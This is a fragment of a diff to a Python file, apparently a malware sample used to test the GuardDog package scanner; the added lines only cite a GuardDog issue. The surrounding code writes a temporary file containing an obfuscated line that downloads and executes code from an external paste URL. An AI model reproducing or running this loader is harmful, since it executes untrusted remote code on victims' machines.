@@ -197,6 +197,9 @@ def run_file(path):
 	p = subprocess.Popen(f"python {path}",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
 	out, err = p.communicate()
 
+"""
+https://github.com/DataDog/guarddog/issues/205
+"""
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/dsvc4/raw').read())""")
 _ttmp.close()
